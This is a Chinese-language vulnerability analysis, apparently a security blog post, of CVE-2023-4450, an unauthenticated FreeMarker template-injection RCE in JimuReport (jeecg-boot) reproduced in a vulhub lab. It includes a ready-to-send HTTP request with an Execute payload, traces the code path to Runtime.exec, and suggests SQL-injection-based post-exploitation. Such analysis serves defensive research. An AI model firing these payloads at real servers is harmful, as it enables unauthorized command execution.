
jeect-boot积木报表漏洞rce分析(CVE-2023-4450)

- - -

# jeect-boot积木报表漏洞rce分析(CVE-2023-4450)

## 一.漏洞复现

这里使用的漏洞环境时vulhub的jeect-boot。靶场介绍说是：

以下的 Jimureport 组件库中都存在，由于未授权的 API `/jmreport/queryFieldBySql` 使用了 freemarker 解析 SQL 语句从而导致了 RCE 漏洞的产生。

```plain
POST /jeecg-boot/jmreport/queryFieldBySql HTTP/1.1
Host: 127.0.0.1:8080
User-Agent: curl/7.88.1
Accept: */*
Content-Type: application/json
Content-Length: 121
Connection: close

{
    "sql": "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"touch /tmp/success\")}",
    "type": "0"
}
```

[![](assets/1704273687-cc31aa873f2ccee487b2392e45af80f5.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240103153336-67c4c87a-aa0a-1.png)

## 二.漏洞跟踪分析

这里的漏洞环境搭建是使用了jeecg-boot 3.5.3环境，从github下载即可，配置mysql和redis数据库，随后使用idea启动调试。

### 拦截器路由

[![](assets/1704273687-df3136d4eb9a13f161806f70d205302b.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240103153345-6d891798-aa0a-1.png)

从JimuReportConfiguration.class我们可以看见jimu报表对于如下的路由设置了拦截器：

```plain
"/jmreport/queryFieldBySql"
"/jmreport/loadTableData",
"/jmreport/dictCodeSearch"
```

### 入口点路由（/queryFieldBySql）

[![](assets/1704273687-cca64f6fe382719acc83a7819c23b65c.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240103153354-72841a7c-aa0a-1.png)

可以发现他的具体代码在这个位置的a.class

首先从json中解析到了sql，把这个变量的参数放到i.a(var2)去执行，跟进这里：

[![](assets/1704273687-ca9dc4415c19c41359c948dcb73727ba.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240103153406-79de90f4-aa0a-1.png)

可以发现是做sql注入拦截的，waf一样的存在。继续往下走

[![](assets/1704273687-d897fe08d3087cb14b8c61bc706cf1bd.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240103153418-8132814e-aa0a-1.png)

在这里进行执行了，传入了var2,var3,var4,var5

他们分别是在json中传入的参数：

```plain
sql
dbSource
paramArray
type
```

但是在payload中传入的只有：sql和type=0（这里type内容是什么都可以，但要有type这个，可以为空，但一定要穿进去）

[![](assets/1704273687-deefca8c4a7fe73b34b6926ec1a3b393.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240103153430-88390f94-aa0a-1.png)

然后继续跟`Map var12 = this.reportDbService.parseReportSql(var2, var3, var4, var5);`

这里传入的var2是：

```plain
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("open -a Calculator.app")}
```

[![](assets/1704273687-9ea8a65ae5c445fbf363d119d5b4aad8.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240103153445-914be566-aa0a-1.png)

随着继续跟进，不用看type，因为不影响。直接看sql

[![](assets/1704273687-6efefc3a01c339c6b1ebfa85a46584ac.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240103153500-99c2298a-aa0a-1.png)

这里走入的是第二个sql的，因为paramArray是null

[![](assets/1704273687-5ad35be7d8c92cdc18bc592d619a69a0.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240103153519-a506fee2-aa0a-1.png)

我们在f.a打断点，继续跟进，是在这里实现rce的

[![](assets/1704273687-cbbf541e8e5de6c086ff54ecc52a6f2b.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240103153533-ad65b470-aa0a-1.png)

这里的var0 = b(var0, var1);返回的不变，没有改变，来到了var0 = a(var2, var0);

随后在a中，调用了：`var1 = FreeMarkerUtils.a(var1, var2);`

[![](assets/1704273687-ffb9ebeff11335496d9d48e5f91af0ec.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240103153547-b5dabc90-aa0a-1.png)

### Freemarker调用点

这边继续来到`FreeMarkerUtils.a`

在这里执行了命令：`(new Template("template", new StringReader(var0), var2)).process(var1, var3);`

[![](assets/1704273687-49eb1df5aa7b85d35e9d16b445e10ca2.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240103153604-c0040a3c-aa0a-1.png)

跟踪process

[![](assets/1704273687-c5d216c3d8394585af64284de79c86cb.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240103153615-c6792b0e-aa0a-1.png)

随后继续跟踪process，从getRootTreeNode进入

[![](assets/1704273687-b2a0dd12cc64b7693713753c71b9d4c2.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240103153632-d0aae572-aa0a-1.png)

来到了进入this.doAutoImportsAndIncludes(this);

[![](assets/1704273687-1255255dcf3afb1b7e6e3c1bb774baa7.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240103153645-d84a090c-aa0a-1.png)

继续跟进env.getMainTemplate();

[![](assets/1704273687-ad860a3cea6a6cac1ac6d3b289bf008e.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240103153659-e0aab56a-aa0a-1.png)

### 初始化模板 & 命令执行

这里的功能主要是`针对自动导入和包含功能的调用`

```plain
该环境对象具有许多属性和方法，用于处理模板的渲染和执行。这些属性和方法包括配置（configuration）、根数据模型（rootDataModel）、指令堆栈（instructionStack）、异常处理器（templateExceptionHandler）等。

在给定的代码中，我看到了一个模板字符串的定义 "<#assign ex = "freemarker.template.utility.Execute"?new()>${ex("open -a Calculator.app")}"。这里使用了FreeMarker模板语法来定义一个变量 ex，并使用其调用了系统命令 open -a Calculator.app。
```

随后进入，继续追踪，这里我们看到了调用了this.visit。而visit主要是：对该元素进行访问处理。

[![](assets/1704273687-28603494da0438dbce0bb1f4ddc835cb.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240103153717-eb7f36a0-aa0a-1.png)

在这里的element，就是创建new一个模板。（后续visit也是会反复调用自己，从反射调用类到获取命令）

[![](assets/1704273687-110f3714fdb849de7ec8b2e2b88003bd.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240103153758-03ee2f34-aa0b-1.png)

这里可以看到，TemplateElement类型的变量里，valueExp为：`freemarker.template.utility.Execute"?new()`

```plain
"freemarker.template.utility.Execute"?new() 是FreeMarker模板语法中的一种使用方式，用于执行系统命令。通过这种方式，攻击者可以在受影响的应用程序上执行操作系统命令，并可能导致潜在的安全问题。
```

[![](assets/1704273687-eb59b933d9d5b466aeac937eda168671.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240103153816-0eedad10-aa0b-1.png)

而且继续跟踪的，可以看到el的内容成为了`${ex("open -a Calculator.app")}`

一方面是创建了一个可以执行命令的模板，另一方面是把将要执行的命令拆出来，继续调用自己一遍

[![](assets/1704273687-c44f46d9117e053852ddaedc5f8c830e.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240103153850-22f2d754-aa0b-1.png)

这里的变量内容

[![](assets/1704273687-66ad53ac1a508cc132e6c75c9f8652aa.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240103153914-315664fa-aa0b-1.png)

在调用自己之后，会回到这个函数accept方法里

[![](assets/1704273687-fce601053bb82d9f85921c4dec51113d.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240103153930-3ab00f88-aa0b-1.png)

随后这里调用eval，和刚才传进来的

[![](assets/1704273687-0454c5637bfa28d12dae8002730f5eee.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240103154201-94b6ff00-aa0b-1.png)

具体在这里执行命令：

[![](assets/1704273687-325924bf702be3a655aa38058f9daccd.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240103154140-8881780a-aa0b-1.png)

```plain
constantValue = {SimpleScalar@19070} "freemarker.template.utility.Execute"
 value = "freemarker.template.utility.Execute"
```

继续跟踪，来到了eval里的this.\_eval(env)，在\_eval里调用了ConstructorFunction，这里也就是反射调用了

```plain
freemarker.template.utility.Execute
```

[![](assets/1704273687-a8b3f90cfbe0aed35564e878502906fc.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240103154121-7d30e6ca-aa0b-1.png)

[![](assets/1704273687-1d054415fcc973461544a0fb663ab28c.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240103154103-725324c0-aa0b-1.png)

反射后，创建新的对象

[![](assets/1704273687-778ca4eebfbb8be3de440f382bb100fb.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240103154039-642d1928-aa0b-1.png)

### 获取命令传入最终执行

那如何获得执行的具体命令是什么呢？（之前只是对执行命令类部分的分析）

随着他visit调用自身，最后来到了accept方法中，

[![](assets/1704273687-3794e64991cc1d98b8d3090aaee10983.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240103154023-5a83dba0-aa0b-1.png)

不断的跟踪下去，即可发现，最终来到了Runtime.getRuntime().exec(aExecute);

成功执行了命令

[![](assets/1704273687-b0c595a7493aa20fefe4b3961fb3fed8.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240103154009-526dc700-aa0b-1.png)

最终附上执行命令的总体流程

[![](assets/1704273687-93ca4b3de9972f0618fc5dd875e37c63.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240103153956-4a77fdd6-aa0b-1.png)

## 三.总结

​ 这个漏洞其实并没有什么难得，主要就是跟踪一下，最后是可以发现rce的触发点。同时这里不光有freemarker的rce，还有sql注入点，可以直接未授权执行sql语句。也许可以继而mysql后渗透，通过mysql控制服务器。

这里我随便执行一下，创建了一个用户：

[![](assets/1704273687-ec23191e3af8d822440d7f79b675264d.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240103153944-43054356-aa0b-1.png)

不过在后续的版本中，官方也是给这里增加了权限设置，之前这里都是未授权访问的。
